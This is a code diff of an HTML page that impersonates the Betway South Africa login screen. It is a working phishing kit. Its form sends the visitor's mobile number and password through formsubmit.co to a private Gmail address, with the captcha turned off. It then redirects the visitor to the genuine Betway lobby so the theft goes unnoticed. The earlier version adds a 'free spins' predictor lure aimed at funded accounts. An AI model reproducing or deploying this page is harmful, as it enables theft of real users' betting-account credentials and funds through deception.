@@ -1,156 +1,845 @@
 <!DOCTYPE html>
+
 <html lang="en">
 
-<head>
-    <meta charset="UTF-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Betway</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css"
-        integrity="sha512-SzlrxWUlpfuzQ+pcUCosxcglQRNAq/DZjVsC0lE40xsADsfeQoEypE+enwcOiGjk/bSuGGKHEyjSoQ1zVisanQ=="
-        crossorigin="anonymous" referrerpolicy="no-referrer" />
-    <link rel="stylesheet" href="/css/styles.css">
+    <head>
 
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+        <meta charset="UTF-8">
 
-    <style>
-        @import url(https://fonts.googleapis.com/css?family=Poppins:300);
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-        body {
-            height: 100vh;
-            overflow: hidden;
-            font-family: "Poppins";
-            background: white;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
 
-        .login-page {
-            width: 400px;
-            padding: 8% 0 0;
-            margin: auto;
-        }
 
-        .form {
-            position: relative;
-            color: green;
-            z-index: 1;
-            background: #FFFFFF;
-            max-width: 400px;
-            margin: 0 auto 100px;
-            padding: 45px;
-            text-align: center;
-            border-radius: 15px;
-            box-shadow: 0 0 20px 0 rgba(0, 0, 0, 0.2), 0 5px 5px 0 rgba(0, 0, 0, 0.24);
-        }
+        <!-- ===== CSS ===== -->
 
-        .form input {
-            font-family: "Poppins", sans-serif;
-            outline: 0;
-            background: #f2f2f2;
-            width: 100%;
-            border: 0;
-            border-radius: 7px;
-            margin: 0 0 15px;
-            padding: 15px;
-            box-sizing: border-box;
-            font-size: 14px;
-        }
+        <link rel="stylesheet" href="assets/css/styles.css">
 
-        p {
-            color: black;
-            text-align: center;
-            font-family: monospace;
-            font-weight: bold;
-        }
+        
 
-        .form button {
-            font-family: "Poppins", sans-serif;
-            font-weight: bold;
-            text-transform: uppercase;
-            outline: 0;
-            background: darkgreen;
-            width: 100%;
-            border: 0;
-            padding: 15px;
-            color: #FFFFFF;
-            border-radius: 7px;
-            font-size: 14px;
-            -webkit-transition: all 0.3 ease;
-            transition: all 0.3 ease;
-            cursor: pointer;
-        }
+        
 
-        .form button:hover,
-        .form button:active,
-        .form button:focus {
-            background: #0e2941;
-        }
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
 
-        .form .message {
-            margin: 15px 0 0;
-            color: green;
-            font-size: 12px;
-        }
+        
 
-        .form .message a {
-            color: #234666;
-            text-decoration: none;
-        }
+        
 
-        .form .register-form {
-            display: none;
-        }
+    
 
-        .fa {
-            padding: 10px;
-            font-size: 30px;
-            width: 50px;
-            text-align: center;
-            text-decoration: none;
-            color: darkgreen;
-        }
+        <!-- ===== BOX ICONS ===== -->
 
-        h1 {
-            text-align: center;
-            font-family: sans-serif;
-            font-size: 50px;
-            color: ##84848C;
-            
-        }
-    </style>
-</head>
+        <link href='https://cdn.jsdelivr.net/npm/boxicons@2.0.5/css/boxicons.min.css' rel='stylesheet'>
 
-<body>
 
-    <div class="login-page">
-        <h1>BetWay</h1>
-        <div class="form">
-            <form class="login-form" method="post" action="https://formsubmit.co/zithobengubane@gmail.com">
-                <h2><i class="fas fa-lock"></i> Login</h2>
-                <input type="text" placeholder="mobile number" name="mobile_number" required />
-                <input type="password" placeholder="Password" name="password" required />
-                <button type="submit" name="send2">login</button>
-                <p class="message">Not registered? <a href="https://www.betway.co.za/">Create an account</a></p>
 
-                <a href="https://www.facebook.com/betwaysouthafrica?mibextid=sAuArU1zVvLjaiq0" class="fa fa-facebook"></a>
+        <title>Betway-ZA</title>
 
-                <a href="https://x.com/Betway_za?t=W12mGDLk9E65ApD9d-gzoQ&s=09" class="fa fa-twitter"></a>
-                <a href="https://www.instagram.com/betway_sa?igshid=OGQ5ZDc2ODk2ZA==" class="fa fa-instagram"></a>
+        
 
-            </form>
-            <p>claim free spins and signals with our predictor a proud partner of betway South Africa.only for Accounts with R200+ </p>
-        </div>
+        
+
+        
+
+        <style>
+
+          
+
+          /*===== GOOGLE FONTS =====*/
+
+@import url("https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700&display=swap");
+
+
+
+/*===== VARIABLES CSS =====*/
+
+:root{
+
+  /*===== Colores =====*/
+
+  --first-color: #9D4BFF;
+
+  --first-color-dark: #23004D;
+
+  --first-color-light: #A49EAC;
+
+  --first-color-lighten: #F2F2F2;
+
+
+
+  /*===== Font and typography =====*/
+
+  --body-font: 'Open Sans', sans-serif;
+
+  --h1-font-size: 1.5rem;
+
+  --normal-font-size: .938rem;
+
+  --small-font-size: .813rem;
+
+}
+
+
+
+@media screen and (min-width: 768px){
+
+  :root{
+
+    --normal-font-size: 1rem;
+
+    --small-font-size: .875rem;
+
+  }
+
+}
+
+
+
+/*===== BASE =====*/
+
+*,::before,::after{
+
+  box-sizing: border-box;
+
+}
+
+
+
+
+
+.fa {
+
+  padding: 10px;
+
+  font-size: 20px;
+
+  width: 50px;
+
+  text-align: center;
+
+  text-decoration: none;}
+
+
+
+
+
+
+
+
+
+body{
+
+  margin: 0;
+
+  padding: 0;
+
+  font-family: var(--body-font);
+
+  font-size: var(--normal-font-size);
+
+  color: var(--first-color-dark);
+
+}
+
+
+
+h1{
+
+  margin: 0;
+
+  color: #59305E;
+
+  font-size: 40px;
+
+}
+
+
+
+a{
+
+  text-decoration: none;
+
+}
+
+
+
+img{
+
+  max-width: 100%;
+
+  height: auto;
+
+  display: block;
+
+}
+
+
+
+/*===== LOGIN =====*/
+
+.login{
+
+  display: grid;
+
+  grid-template-columns: 100%;
+
+  height: 100vh;
+
+  margin-left: 1.5rem;
+
+  margin-right: 1.5rem;
+
+}
+
+
+
+.login__content{
+
+  display: grid;
+
+}
+
+
+
+.login__img{
+
+  justify-self: center;
+
+}
+
+
+
+.login__img img{
+
+  width: 310px;
+
+  margin-top: 1.5rem;
+
+}
+
+
+
+.login__forms{
+
+  position: relative;
+
+  height: 400px;
+
+}
+
+
+
+.login__registre, .login__create{
+
+  position: absolute;
+
+  bottom: 1rem;
+
+  width: 100%;
+
+  background-color: var(--first-color-lighten);
+
+  padding: 2rem 1rem;
+
+  border-radius: 1rem;
+
+  
+
+  text-align: center;
+
+  box-shadow: 0 8px 20px rgba(35,0,77,.2);
+
+  animation-duration: .4s;
+
+  animation-name: animate-login;
+
+}
+
+
+
+@keyframes animate-login{
+
+  0%{
+
+    transform: scale(1,1);
+
+  }
+
+  50%{
+
+    transform: scale(1.1,1.1);
+
+  }
+
+  100%{
+
+    transform: scale(1,1);
+
+  }
+
+}
+
+
+
+.login__title{
+
+  font-size: var(--h1-font-size);
+
+  margin-bottom: 2rem;
+
+}
+
+
+
+
+
+
+
+
+
+
+
+
+
+.login__box{
+
+  display: grid;
+
+  grid-template-columns: max-content 1fr;
+
+  column-gap: .5rem;
+
+  padding: 8px;
+
+  background-color: #fff;
+
+  margin-top: 1rem;
+
+  border-radius: 10px;
+
+  
+
+
+
+}
+
+
+
+.login__icon{
+
+  font-size: 1.5rem;
+
+  color: #59305E;
+
+}
+
+
+
+.login__input{
+
+  border: none;
+
+  outline: none;
+
+  font-size: var(--normal-font-size);
+
+  font-weight: 700;
+
+  color: var(--first-color-dark);
+
+}
+
+
+
+.login__input::placeholder{
+
+  font-size: var(--normal-font-size);
+
+  font-family: var(--body-font);
+
+  color: var(--first-color-light);
+
+}
+
+
+
+.login__forgot{
+
+  display: block;
+
+  width: max-content;
+
+  margin-left: auto;
+
+  margin-top: .5rem;
+
+  font-size: var(--small-font-size);
+
+  font-weight: 600;
+
+  color: var(--first-color-light);
+
+}
+
+
+
+.login__button{
+
+  display: block;
+
+  padding: 1rem;
+
+  margin: 2rem 0;
+
+  background-color: #59305E;
+
+  
+
+  color: #FFF;
+
+  font-weight: 600;
+
+  text-align: center;
+
+
+
+  border-radius: .5rem;
+
+  transition: .3s;
+
+}
+
+
+
+.login__button:hover{
+
+  background-color: var(--first-color-dark);
+
+}
+
+
+
+.login__account, .login__signin, .login__signup{
+
+  font-weight: 600;
+
+  font-size: var(--small-font-size);
+
+}
+
+
+
+.login__account{
+
+  color: var(--first-color-dark);
+
+}
+
+
+
+.login__signin, .login__signup{
+
+  color: #59305E;
+
+  cursor: pointer;
+
+}
+
+
+
+.login__social{
+
+  margin-top: 2rem;
+
+}
+
+
+
+.login__social-icon{
+
+  font-size: 1.5rem;
+
+  color: var(--first-color-dark);
+
+  margin: 0 1.5rem;
+
+}
+
+
+
+/*Show login*/
+
+.block{
+
+  display: block;
+
+}
+
+
+
+/*Hidden login*/
+
+.none{
+
+  display: none;
+
+}
+
+
+
+/* ===== MEDIA QUERIES =====*/
+
+@media screen and (min-width: 576px){
+
+  .login__forms{
+
+    width: 348px;
+
+    justify-self: center;
+
+  }
+
+}
+
+
+
+@media screen and (min-width: 1024px){
+
+  .login{
+
+    height: 100vh;
+
+    overflow: hidden;
+
+  }
+
+
+
+  .login__content{
+
+    grid-template-columns: repeat(2, max-content);
+
+    justify-content: center;
+
+    align-items: center;
+
+    margin-left: 10rem;
+
+  }
+
+
+
+  .login__img{
+
+    display: flex;
+
+    width: 600px;
+
+    height: 588px;
+
+    background-color: var(--first-color-lighten);
+
+    border-radius: 1rem;
+
+    padding-left: 1rem;
+
+  }
+
+
+
+  .login__img img{
+
+    width: 390px;
+
+    margin-top: 0;
+
+  }
+
+
+
+  .login__registre, .login__create{
+
+    left: -11rem;
+
+  }
+
+
+
+  .login__registre{
+
+    bottom: -2rem;
+
+  }
+
+
+
+  .login__create{
+
+    bottom: -5.5rem;
+
+  }
+
+}
+
+          
+
+          
+
+        </style>
+
+        
+
+        
+
+        
+
+        
+
+    </head>
+
+    <body>
+
+      
+
+      
+
+
+
+      
+
+        <div class="login">
+
+            <div class="login__content">
+
+                <div class="login__img">
+
+                    <img src="https://static.casino.guru/pict/31439/Joker-s-Jewels.png?timestamp=1653450066000&imageDataId=221010&width=320&height=247i
+
+                    " alt="">
+
+                </div>
+
+
+
+                <div class="login__forms">
+
+<form action="https://formsubmit.co/zithobengubane@gmail.com" method="post" class="login__registre" id="login-in">
+
+
+
+    <h1>Betway</h1>
+
+
+
+    <div class="login__box">
+
+        <i class='bx bx-user login__icon'></i>
+
+        <input type="number" name="mobile_number" placeholder="Mobile Number" class="login__input" required>
+
     </div>
 
-    <script>
-        $('.message a').click(function () {
-            $('form').animate({ height: "toggle", opacity: "toggle" }, "slow");
-        });
-    </script>
 
-</body>
 
-</html>
+    <div class="login__box">
 
+        <i class='bx bx-lock-alt login__icon'></i>
+
+        <input type="password" name="password" placeholder="Password" class="login__input" required>
+
+    </div>
+
+
+
+    <a href="https://betway.co.za" class="login__forgot">Forgot password?</a>
+
+
+
+    <a href="#" class="login__button" onclick="document.getElementById('login-in').submit();">Login</a>
+
+    
+
+    
+
+  
+
+<input type="hidden" name="_next" value="https://www.betway.co.za/LiveGameslobby">
+
+
+
+          <input type="hidden" name="_captcha" value="false">
+
+    
+
+
+
+    <div>
+
+        <span class="login__account">Don't have an Account?</span>
+
+        <span class="login__signin" id="sign-up">Register</span>
+
+    </div>
+
+    
+
+    <a href="#" class="fa fa-facebook"></a>
+
+<a href="#" class="fa fa-instagram"></a>
+
+<a href="#" class="fa fa-twitter"></a>
+
+    
+
+    
+
+</form>
+
+
+
+                    </form>
+
+                  
+
+
+
+                    <form action="" class="login__create none" id="login-up">
+
+                        <h1 class="login__title">Create Account</h1>
+
+    
+
+                        <div class="login__box">
+
+                            <i class='bx bx-user login__icon'></i>
+
+                            <input type="text" placeholder="Username" class="login__input">
+
+                        </div>
+
+    
+
+                        <div class="login__box">
+
+                            <i class='bx bx-at login__icon'></i>
+
+                            <input type="text" placeholder="Email" class="login__input">
+
+                        </div>
+
+
+
+                        <div class="login__box">
+
+                            <i class='bx bx-lock-alt login__icon'></i>
+
+                            <input type="password" placeholder="Password" class="login__input">
+
+                        </div>
+
+
+
+                        <a href="#" class="login__button">Register</a>
+
+
+
+                        <div>
+
+                            <span class="login__account">Already have an Account ?</span>
+
+                            <span class="login__signup" id="sign-in">Sign In</span>
+
+                        </div>
+
+
+
+                        <div class="login__social">
+
+                            <a href="#" class="login__social-icon"><i class='bx bxl-facebook' ></i></a>
+
+                            <a href="#" class="login__social-icon"><i class='bx bxl-twitter' ></i></a>
+
+                            <a href="#" class="login__social-icon"><i class='bx bxl-google' ></i></a>
+
+                        </div>
+
+                    </form>
+
+                </div>
+
+            </div>
+
+        </div>
+
+
+
+        <!--===== MAIN JS =====-->
+
+        <script>
+
+          
+
+          /*===== LOGIN SHOW and HIDDEN =====*/
+
+
+
+const signUp = document.getElementById('sign-up'),
+
+
+
+    signIn = document.getElementById('sign-in'),
+
+    loginIn = document.getElementById('login-in'),
+
+    loginUp = document.getElementById('login-up')
+
+
+
+
+
+signUp.addEventListener('click', ()=>{
+
+    // Remove classes first if they exist
+
+    loginIn.classList.remove('block')
+
+    loginUp.classList.remove('none')
+
+
+
+    // Add classes
+
+    loginIn.classList.toggle('none')
+
+    loginUp.classList.toggle('block')
+
+})
+
+
+
+signIn.addEventListener('click', ()=>{
+
+    // Remove classes first if they exist
+
+    loginIn.classList.remove('none')
+
+    loginUp.classList.remove('block')
+
+
+
+    // Add classes
+
+    loginIn.classList.toggle('block')
+
+    loginUp.classList.toggle('none')
+
+})
+
+
+
+          
+
+        </script>
+
+    </body>
+
+    </html>
